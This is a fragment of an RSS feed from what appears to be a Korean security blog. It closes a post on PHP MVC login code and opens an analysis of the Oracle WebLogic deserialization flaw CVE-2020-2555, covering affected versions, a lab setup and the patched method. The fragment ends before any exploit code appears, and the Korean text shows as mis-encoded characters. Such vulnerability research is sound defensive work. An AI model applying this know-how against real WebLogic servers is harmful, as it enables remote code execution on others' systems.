                &lt;span class=&quot;s2&quot;&gt;&quot;login&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$res_login&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;alert_notify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ë¡œê·¸ì¸ì— ì„±ê³µí•˜ì˜€ìŠµë‹ˆë‹¤. &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$alert&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;xss_check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;ë‹˜ ë°˜ê°‘ìŠµë‹ˆë‹¤.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;success&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;alert_notify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ì•„ì´ë”” ë˜ëŠ” íŒ¨ìŠ¤ì›Œë“œë¥¼ ì¬í™•ì¸ í•´ì£¼ì‹­ì‹œì˜¤.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;error&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;.....&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ìƒëµ&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;[/controller/sign.php]&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;sign controllerëŠ” íšŒì›ê°€ì…/ë¡œê·¸ì¸ì„ ë‚´ë¶€ì ìœ¼ë¡œ ì–´ë–»ê²Œ ì²˜ë¦¬í• ì§€ ì •ì˜ë˜ì–´ ìˆë‹¤.&lt;/p&gt;

&lt;p&gt;í˜„ì¬ â€œhttp://&lt;ip&gt;/signup&quot;ìœ¼ë¡œ ì ‘ì†í•˜ë©´ route.phpë¥¼ í†µí•˜ì—¬ sign.phpì˜ sign í´ë˜ìŠ¤ë¥¼ ë¶ˆëŸ¬ì™€ signin_index í•¨ìˆ˜ë¥¼ ì‹¤í–‰ì‹œí‚¨ë‹¤. í•´ë‹¹ í•¨ìˆ˜ëŠ” ë‹¨ìˆœíˆ ì–´ë–¤ ê±¸ ì²˜ë¦¬í•˜ê¸°ë³´ë‹¨ ì‚¬ìš©ìê°€ ë¡œê·¸ì¸í•  ìˆ˜ ìˆë„ë¡ Controllerê°€ View(ë¡œê·¸ì¸ í™”ë©´)ë¥¼ ì‚¬ìš©ìì—ê²Œ ì „ë‹¬í•œë‹¤.&lt;/ip&gt;&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;require_once&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_VIEW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;_template/head.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;section&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;section section-shaped section-lg&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;height: 100vh;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;shape shape-style-1 bg-gradient-default&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;container pt-lg-9&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;row justify-content-center&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-lg-5&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
          &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;card bg-secondary shadow border-0&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;card-body px-lg-5 py-lg-5&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
              &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text-center text-muted mb-4&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;font-weight: 700;&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Log In&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
              &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
              &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;role=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;POST&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/signin&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-group mb-3&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
                  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;input-group input-group-alternative&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
                    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;input-group-prepend&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
                      &lt;span class=&quot;nt&quot;&gt;&amp;lt;span&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;input-group-text&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;i&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ni ni-email-83&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/i&amp;gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
                    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
                    &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-control&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ID&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;id&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;required&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
                  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-group focused&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
                  &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;input-group input-group-alternative&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
                    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;input-group-prepend&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
                      &lt;span class=&quot;nt&quot;&gt;&amp;lt;span&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;input-group-text&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;i&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ni ni-lock-circle-open&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/i&amp;gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
                    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
                    &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;form-control&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;required&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
                  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text-center&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
                  &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;btn btn-primary my-4&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;value=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;ë¡œê·¸ì¸&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
                &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
              &lt;span class=&quot;nt&quot;&gt;&amp;lt;/form&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
          &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
          &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;row mt-3&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-6&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
              &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;#&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text-light&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;small&amp;gt;&lt;/span&gt;Forgot password?&lt;span class=&quot;nt&quot;&gt;&amp;lt;/small&amp;gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-6 text-right&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
              &lt;span class=&quot;nt&quot;&gt;&amp;lt;a&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;#&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text-light&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;small&amp;gt;&lt;/span&gt;Create new account&lt;span class=&quot;nt&quot;&gt;&amp;lt;/small&amp;gt;&amp;lt;/a&amp;gt;&lt;/span&gt;
            &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
          &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
        &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
      &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/section&amp;gt;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;require_once&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;_VIEW&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;_template/footer.php&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;[/application/view/sign/signin.php]&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ë¡œê·¸ì¸ í˜ì´ì§€ë¥¼ ë‹´ë‹¹í•˜ëŠ” View ì˜ì—­ì˜ signin.php ì½”ë“œì…ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;ê·¸ ì™¸ íšŒì›ê°€ì…, ê²Œì‹œíŒ ê¸€ ë“±ë¡ ë“± ë¡œì§ì€ ìœ„ì™€ ê°™ì´ ë°©ì‹ìœ¼ë¡œ ë‚˜ëˆ  ì²˜ë¦¬ë¥¼ ì§„í–‰í•˜ë©´ ë©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;MVC íŒ¨í„´ì„ í†µí•˜ì—¬ ì¤‘ë³µë˜ëŠ” ì½”ë“œë¥¼ ìµœì†Œí™”ë¥¼ ì‹œí‚¬ ìˆ˜ ìˆì—ˆìœ¼ë‚˜ í•´ë‹¹ ì½”ë“œë¥¼ ì „ë¶€ ì„¤ëª…í•˜ê¸°ì—” ë„ˆë¬´ ê¸¸ì–´ ì¶”í›„ì— gitlabì— ì£¼ì„ê³¼ í•¨ê»˜ ê³µê°œí•  ì˜ˆì •ì…ë‹ˆë‹¤.&lt;/p&gt;
</description>
        <pubDate>Wed, 01 Jul 2020 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/2020-07-01/PHP-MVC-pat</link>
        <guid isPermaLink="true">http://localhost:4000/2020-07-01/PHP-MVC-pat</guid>
        
        <category>programming</category>
        
        
      </item>
    
      <item>
        <title>Oracle WebLogic Deserialization CVE-2020-2555_1</title>
        <description>&lt;p&gt;ë¼ì˜¨í™”ì´íŠ¸í–‡ í•µì‹¬ì—°êµ¬íŒ€ ê¹€ë™ë¯¼&lt;/p&gt;

&lt;h2 id=&quot;ì†Œê°œ&quot;&gt;ì†Œê°œ&lt;/h2&gt;

&lt;p&gt;Oracle WebLogic Deserialization (CVE-2020-2555)&lt;/p&gt;

&lt;p&gt;4ì›” 14ì¼ Oracle Fusion Middlewareì—ì„œ 51ê°œì˜ íŒ¨ì¹˜ë¥¼ í¬í•¨í•œ 1/4ë¶„ê¸° Critical Patch Update(CPU)ë¥¼ ë°œí‘œí•˜ì˜€ìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ëª‡ì¼ ë’¤ 4ì›” 30ì¼ í•˜ë‚˜ì˜ ë¸”ë¡œê·¸ë¥¼ ê²Œì‹œí•˜ë©° ê³ ê°ë“¤ì—ê²Œ ê¸´ê¸‰íŒ¨ì¹˜ë¥¼ ê¶Œê³ í•˜ì˜€ìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ Oracle WebLogic Serverì— ë°œìƒí•œ Deserialization ì·¨ì•½ì ì´ë©° Remote Code Execution(RCE)ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/dm0700.png&quot; alt=&quot;/assets/dm0700.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://blogs.oracle.com/security/apply-april-2020-cpu&quot;&gt;Customers should apply the April 2020 Critical Patch Update without delay!&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;affected-versions&quot;&gt;Affected Versions&lt;/h3&gt;

&lt;table class=&quot;mbtablestyle&quot;&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;10.3.6.0.0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;12.1.3.0.0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;12.2.1.3.0&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;12.2.1.4.0&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;

&lt;p&gt;í•´ë‹¹ ì·¨ì•½ì ì€ Oracle Coherence ë¼ì´ë¸ŒëŸ¬ë¦¬ì˜ Deserialization ì·¨ì•½ì ìœ¼ë¡œ, ë°ì´í„°ë¥¼ ì••ì¶•/ì••ì¶•í•´ì œ(Serialize/Deserialize)ì„ ì•…ìš©í•˜ì—¬ ì¸ì¦ë˜ì§€ ì•Šì€ ì›ê²© ê³µê²©ìê°€ ì·¨ì•½í•œ WebLogic ì„œë²„ì˜ T3 í¬íŠ¸ì— íŠ¹ìˆ˜í•˜ê²Œ ì œì‘ëœ íŒ¨í‚·ì„ ìš”ì²­í•¨ìœ¼ë¡œì¨, ì›ê²© ì½”ë“œ ì‹¤í–‰ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;ì˜¤ë¼í´ ì½”íˆì–´ëŸ°ìŠ¤(Oracle Coherence)ëŠ” ìë°” ê¸°ë°˜ì˜ ë°ì´í„° ê·¸ë¦¬ë“œ ì œí’ˆìœ¼ë¡œì„œ, ë°ì´í„° ìºì‹±, ë°ì´í„° ë³µì œ, ë¶„ì‚° ì»´í“¨íŒ… ì„œë¹„ìŠ¤ë¥¼ ì œê³µí•œë‹¤.
ì½”íˆì–´ëŸ°ìŠ¤ëŠ” backing mapì„ ì‚¬ìš©í•˜ì—¬ ë°ì´í„°ë² ì´ìŠ¤ ì´ì™¸ì˜ ìŠ¤í† ë¦¬ì§€ì—ì„œë„ ì•ˆì •ì ì¸ ì„œë¹„ìŠ¤ë¥¼ ì œê³µí•  ìˆ˜ ìˆê²Œ í•œë‹¤.
ìë°”ë¡œ êµ¬í˜„ë˜ì–´ ìˆì§€ë§Œ, ì½”íˆì–´ëŸ°ìŠ¤*ì—‘ìŠ¤í…ë“œ ì½¤í¬ë„ŒíŠ¸ë¥¼ í†µí•´ì„œ .NETì´ë‚˜ C++ê³¼ì˜ ì ‘ì†ë„ ê°€ëŠ¥í•˜ë‹¤.
ì½”íˆì–´ëŸ°ìŠ¤ ì‚¬ìš© íŒ¨í„´ ì¤‘ ì¼ë¶€ëŠ” ì˜¤í”ˆ ì†ŒìŠ¤ì´ë©°, ì˜¤ë¼í´ ì½”íˆì–´ëŸ°ìŠ¤ ì¸íë² ì´í„°ë¥¼ í†µí•´ ê²Œì¬ ë° ì§€ì›ë˜ê³  ìˆë‹¤. ì´ëŸ¬í•œ íŒ¨í„´ì—ëŠ” ì½”íˆì–´ëŸ°ìŠ¤ë¡œ WANë¥¼ ê±¸ì¹œ ë©”ì‹œì§€ ì†¡ìˆ˜ì‹ , ì‘ì—… ë¶„ì‚°, ë°ì´í„° ë³µì œ ê¸°ëŠ¥ ë“±ì´ ìˆë‹¤.
ì½”íˆì–´ëŸ°ìŠ¤ ì œí’ˆì€ ë³¸ë˜ íƒ±ê³ ì†”(Tangosol)ì‚¬ê°€ ê°œë°œí•˜ì˜€ëŠ”ë°, 2007ë…„ 4ì›”ì— ì˜¤ë¼í´ì´ ê·¸ íšŒì‚¬ë¥¼ ë§¤ì…í•˜ì˜€ë‹¤. í˜„ì¬ëŠ” ì˜¤ë¼í´ í“¨ì „ ë¯¸ë“¤ì›¨ì–´ì˜ ì»´í¬ë„ŒíŠ¸ ì¤‘ í•˜ë‚˜ë¡œ ì œê³µë˜ê³  ìˆë‹¤.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;a href=&quot;https://ko.wikipedia.org/wiki/%EC%98%A4%EB%9D%BC%ED%81%B4_%EC%BD%94%ED%9E%88%EC%96%B4%EB%9F%B0%EC%8A%A4&quot;&gt;ì˜¤ë¼í´ ì½”íˆì–´ëŸ°ìŠ¤&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;í…ŒìŠ¤íŠ¸-í™˜ê²½&quot;&gt;í…ŒìŠ¤íŠ¸ í™˜ê²½&lt;/h3&gt;

&lt;table class=&quot;mbtablestyle&quot;&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Attacker OS&lt;/td&gt;
      &lt;td&gt;Windows 10&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Attacker IP&lt;/td&gt;
      &lt;td&gt;172.16.9.15&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Victim OS&lt;/td&gt;
      &lt;td&gt;Ubuntu 18.04&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Victim IP&lt;/td&gt;
      &lt;td&gt;192.168.201.132&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Oracle WebLogic Version&lt;/td&gt;
      &lt;td&gt;12.2.1.4.0&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/dm0701.png&quot; alt=&quot;/assets/dm0701.png&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;í•´ë‹¹ ì·¨ì•½ì ì— ëŒ€í•œ íŒ¨ì¹˜ë¥¼ ë³´ë©´ LimitFilter í´ë˜ìŠ¤ì˜ toString() í•¨ìˆ˜ì—ì„œ extract() ë©”ì†Œë“œê°€ ì œê±°ëœ ê²ƒì„í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.&lt;/li&gt;
